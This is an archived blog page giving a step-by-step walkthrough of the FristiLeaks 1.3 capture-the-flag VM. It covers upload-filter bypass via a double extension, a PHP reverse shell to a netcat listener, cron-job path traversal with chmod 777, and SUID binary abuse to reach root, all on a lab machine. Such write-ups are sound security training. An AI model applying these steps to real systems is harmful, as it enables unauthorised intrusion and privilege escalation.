@@ -1,0 +1,679 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+
+<!-- Mirrored from highon.coffee/blog/fristileaks-walkthrough/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 18:04:48 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<script src="https://highon.coffee/cdn-cgi/apps/head/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><link rel="canonical" href="index.html">
+<title>FristiLeaks 1.3 Walkthrough</title>
+<meta name="description" content="FristiLeaks - Walkthrough Guide">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic,900">
+<link rel="stylesheet" type="text/css" href="https://highon.coffee/css/screen.css">
+<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="https://highon.coffee/img/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="../index.html">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+FristiLeaks 1.3 Walkthrough
+<a href="index.html" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+walkthroughs
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+15 Dec 2015
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<div class="coffee-rating">
+<table>
+<tbody>
+<tr>
+<td>
+<p><code>Coffee Difficulty Rating:</code></p>
+</td>
+<td>
+<p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul id="markdown-toc">
+<li><a href="#author-description" id="markdown-toc-author-description">Author Description</a> <ul>
+<li><a href="#port-scanning" id="markdown-toc-port-scanning">Port Scanning</a></li>
+<li><a href="#service-enumeration" id="markdown-toc-service-enumeration">Service Enumeration</a></li>
+<li><a href="#http-enumeration" id="markdown-toc-http-enumeration">HTTP Enumeration</a></li>
+</ul>
+</li>
+<li><a href="#php-reverse-shell" id="markdown-toc-php-reverse-shell">PHP Reverse Shell</a></li>
+<li><a href="#local-enumeration" id="markdown-toc-local-enumeration">Local Enumeration</a> <ul>
+<li><a href="#homeadmin" id="markdown-toc-homeadmin">/home/admin</a></li>
+</ul>
+</li>
+<li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a></li>
+<li><a href="#root-flag" id="markdown-toc-root-flag">Root Flag</a></li>
+</ul>
+<h2 id="author-description">Author Description</h2>
+<p>A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..</p>
+<div class="note warning">
+<h5>VMWare Users - MAC Address</h5>
+<p>If you are a VMWare user, you'll need to manually set the MAC Address to <code>08:00:27:A5:A6:76</code>.</p>
+</div>
+<h3 id="port-scanning">Port Scanning</h3>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap -v -p 1-65535 -sV -O -sT 192.168.221.150</code></pre></figure>
+<h3 id="service-enumeration">Service Enumeration</h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>TCP: 80</code></p></pc>
+</td>
+<td>
+<pc><p>HTTP</p></pc>
+</td>
+<td>
+<pc><p>Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<p>Enumeration of the web application, revealed the page <code>/fristi</code> with the following form:</p>
+<p><img src="https://highon.coffee/img/blog/fristileaks/webform.png" alt="webform" /></p>
+<p>Page source interrogation revealed the following code comment:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;!--
+TODO:
+We need to clean this up <span class="k">for </span>production. I left some junk <span class="k">in </span>here to make testing easier.
+
+- by eezeepz
+--&gt;</code></pre></figure>
+<p>The following base64 encoded image was also discovered and decoded to reveal an image containing the string: <code>keKkeKKeKKeKkEkkEk</code></p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span><span class="se">\n</span><span class="s2">jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl</span><span class="se">\n</span><span class="s2">S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw</span><span class="se">\n</span><span class="s2">B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f</span><span class="se">\n</span><span class="s2">m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ</span><span class="se">\n</span><span class="s2">Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb</span><span class="se">\n</span><span class="s2">DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd</span><span class="se">\n</span><span class="s2">jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU</span><span class="se">\n</span><span class="s2">12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5</span><span class="se">\n</span><span class="s2">uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1</span><span class="se">\n</span><span class="s2">04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq</span><span class="se">\n</span><span class="s2">i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg</span><span class="se">\n</span><span class="s2">tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws</span><span class="se">\n</span><span class="s2">30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl</span><span class="se">\n</span><span class="s2">3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK</span><span class="se">\n</span><span class="s2">ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q</span><span class="se">\n</span><span class="s2">mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34</span><span class="se">\n</span><span class="s2">rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe</span><span class="se">\n</span><span class="s2">EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH</span><span class="se">\n</span><span class="s2">AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk</span><span class="se">\n</span><span class="s2">CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR</span><span class="se">\n</span><span class="s2">U5ErkJggg=="</span> | base64 --decode
+ 1274<span class="k">*</span> <span class="nb">echo</span> <span class="s2">"iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span><span class="se">\n</span><span class="s2">jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl</span><span class="se">\n</span><span class="s2">S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw</span><span class="se">\n</span><span class="s2">B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f</span><span class="se">\n</span><span class="s2">m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ</span><span class="se">\n</span><span class="s2">Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb</span><span class="se">\n</span><span class="s2">DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd</span><span class="se">\n</span><span class="s2">jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU</span><span class="se">\n</span><span class="s2">12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5</span><span class="se">\n</span><span class="s2">uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1</span><span class="se">\n</span><span class="s2">04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq</span><span class="se">\n</span><span class="s2">i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg</span><span class="se">\n</span><span class="s2">tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws</span><span class="se">\n</span><span class="s2">30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl</span><span class="se">\n</span><span class="s2">3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK</span><span class="se">\n</span><span class="s2">ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q</span><span class="se">\n</span><span class="s2">mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34</span><span class="se">\n</span><span class="s2">rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe</span><span class="se">\n</span><span class="s2">EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH</span><span class="se">\n</span><span class="s2">AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk</span><span class="se">\n</span><span class="s2">CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR</span><span class="se">\n</span><span class="s2">U5ErkJggg=="</span> | base64 --decode &gt; image.png</code></pre></figure>
+<p>The following credentials were used to login to the web application:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><b>eezeepz</b></p></pc>
+</td>
+<td>
+<pc><p><code>keKkeKKeKKeKkEkkEk</code></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="php-reverse-shell">PHP Reverse Shell</h2>
+<p>The file name <code>shell.php.png</code> was used to bypass the web application filtering, the file was still executed as PHP (likely due to incorrectly configured Apache MIME types). A reverse shell successfully connected back to a netcat listener.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">[root:~]# </span>netcat -n -v -l -p 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.221.139] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.221.150] 34400
+Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 <span class="c">#1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 18:26:33 up  5:37,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              <a href="https://highon.coffee/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="672b28202e2927">[email&#160;protected]</a>   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+sh: no job control <span class="k">in </span>this shell
+<span class="gp">sh-4.1$ </span>whoami
+whoami
+apache</code></pre></figure>
+<h2 id="local-enumeration">Local Enumeration</h2>
+<p>Enumeration of the users home dir found several binary files and the following txt file:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">sh-4.1$ </span>cat notes
+cat notes.txt
+Yo EZ,
+
+I made it possible <span class="k">for </span>you to <span class="k">do </span>some automated checks,
+but I did only allow you access to /usr/bin/<span class="k">*</span> system binaries. I did
+however copy a few extra often needed commands to my
+homedir: chmod, df, cat, <span class="nb">echo</span>, ps, grep, egrep so you can use those
+from /home/admin/
+
+Don<span class="s1">'t forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The
+output goes to the file "cronresult" in /tmp/. It should
+run every minute with my account privileges.
+
+- Jerry</span></code></pre></figure>
+<p>The following directory traversal (the command had to originate from /usr/bin/) was used to set the permissions for <code>/home/admin</code> <strong>world readable</strong>.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"/usr/bin/../../bin/chmod -R 777 /home/admin"</span> &gt; /tmp/runthis</code></pre></figure>
+<h3 id="homeadmin">/home/admin</h3>
+<p>Inspection of <code>/home/admin</code> disclosed the following:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">sh-4.1$ </span><span class="nb">cd</span> /home/admin
+<span class="nb">cd</span> /home/admin
+<span class="gp">sh-4.1$ </span>ls -la
+ls -la
+total 652
+drwxrwxrwx. 2 admin     admin       4096 Nov 19 02:03 .
+drwxr-xr-x. 5 root      root        4096 Nov 19 01:40 ..
+-rwxrwxrwx. 1 admin     admin         18 Sep 22 12:40 .bash_logout
+-rwxrwxrwx. 1 admin     admin        176 Sep 22 12:40 .bash_profile
+-rwxrwxrwx. 1 admin     admin        124 Sep 22 12:40 .bashrc
+-rwxrwxrwx  1 admin     admin      45224 Nov 18 13:42 cat
+-rwxrwxrwx  1 admin     admin      48712 Nov 18 14:14 chmod
+-rwxrwxrwx  1 admin     admin        737 Nov 18 14:48 cronjob.py
+-rwxrwxrwx  1 admin     admin         21 Nov 18 15:21 cryptedpass.txt
+-rwxrwxrwx  1 admin     admin        258 Nov 18 15:20 cryptpass.py
+-rwxrwxrwx  1 admin     admin      90544 Nov 18 13:49 df
+-rwxrwxrwx  1 admin     admin      24136 Nov 18 13:40 <span class="nb">echo</span>
+-rwxrwxrwx  1 admin     admin     163600 Nov 18 13:42 egrep
+-rwxrwxrwx  1 admin     admin     163600 Nov 18 13:42 grep
+-rwxrwxrwx  1 admin     admin      85304 Nov 18 13:41 ps
+-rw-r--r--  1 fristigod fristigod     25 Nov 19 01:47 whoisyourgodnow.txt
+<span class="gp">sh-4.1$ </span>cat whoisyourgodnow.txt
+cat whoisyourgodnow.txt
+<span class="o">=</span>RFn0AKnlMHMPIzpyuTI0ITG
+<span class="gp">sh-4.1$ </span>cat cryptedpass.txt
+cat cryptedpass.txt
+mVGZ3O3omkJLmy2pcuTq</code></pre></figure>
+<p>The following python script appeared to create the above string in cryptedpass.txt:</p>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">sh</span><span class="o">-</span><span class="mf">4.1</span><span class="err">$</span> <span class="n">cat</span> <span class="n">cryptpass</span><span class="o">.</span><span class="n">py</span>
+<span class="n">cat</span> <span class="n">cryptpass</span><span class="o">.</span><span class="n">py</span>
+<span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
+<span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span><span class="nn">codecs</span><span class="o">,</span><span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">encodeString</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="n">base64string</span><span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">base64string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="s">'rot13'</span><span class="p">)</span>
+
+<span class="n">cryptoResult</span><span class="o">=</span><span class="n">encodeString</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="k">print</span> <span class="n">cryptoResult</span></code></pre></figure>
+<p>The above script was modified on the attacking machine to decode the string:</p>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
+<span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span><span class="nn">codecs</span><span class="o">,</span><span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">encodeString</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="n">base64string</span><span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">codecs</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">base64string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="s">'rot13'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">decodeString</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="n">string</span> <span class="o">=</span> <span class="nb">str</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">string</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"rot13"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">decodeString</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span></code></pre></figure>
+<p>String successfully decoded:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">[root:~]# </span>python reverse.py <span class="s2">"=RFn0AKnlMHMPIzpyuTI0ITG"</span>
+LetThereBeFristi!</code></pre></figure>
+<p>Using the previously decoded string it was possible to <code>su -</code> to the user <strong>fristigod</strong>.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">sh-4.1$ </span>python -c <span class="s1">'import pty;pty.spawn("/bin/sh")'</span>
+python -c <span class="s1">'import pty;pty.spawn("/bin/sh")'</span>
+<span class="gp">sh-4.1$ </span>su - fristigod
+su - fristigod
+Password: LetThereBeFristi!
+
+<span class="gp">-bash-4.1$ </span>id
+id
+<span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span></code></pre></figure>
+<p>Enumeration as the user <strong>fristigod</strong> revealed the SUID binary: <code>/var/fristigod/.secret_admin_stuff/doCom</code>.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">-bash-4.1$ </span>ls -la /var/fristigod
+ls -la /var/fristigod
+total 16
+drwxr-x---   3 fristigod fristigod 4096 Nov 25 05:55 .
+drwxr-xr-x. 19 root      root      4096 Nov 19 01:41 ..
+-rw-------   1 fristigod fristigod  864 Nov 25 06:09 .bash_history
+drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25 05:53 .secret_admin_stuff
+<span class="gp">-bash-4.1$ </span><span class="nb">cd</span> .se
+<span class="nb">cd</span> .secret_admin_stuff/
+<span class="gp">-bash-4.1$ </span>ls
+ls
+doCom
+<span class="gp">-bash-4.1$ </span>ls -la
+ls -la
+total 16
+drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25 05:53 .
+drwxr-x---  3 fristigod fristigod 4096 Nov 25 05:55 ..
+-rwsr-sr-x  1 root      root      7529 Nov 25 05:53 doCom
+<span class="gp">-bash-4.1$ </span>./d
+./doCom
+Nice try, but wrong user ;<span class="o">)</span></code></pre></figure>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Execution of the doCom binary was possible using the user <strong>fristi</strong> from the logged in user <strong>fristigod</strong>, successfully escalating privileges.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sudo -u fristi .secret_admin_stuff/doCom /bin/sh
+<span class="gp">sh-4.1# </span>id
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>100<span class="o">(</span>users<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>100<span class="o">(</span>users<span class="o">)</span>,502<span class="o">(</span>fristigod<span class="o">)</span></code></pre></figure>
+<h2 id="root-flag">Root Flag</h2>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">cat fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>https://tldr.nu]
+
+I wonder <span class="k">if </span>you beat it <span class="k">in </span>the maximum 4 hours it<span class="s1">'s supposed to take!
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1</span></code></pre></figure>
+<p>Thanks for the VM :)</p>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=FristiLeaks%201.3%20Walkthrough&amp;url=https://highon.coffee/blog/fristileaks-walkthrough/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/fristileaks-walkthrough/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
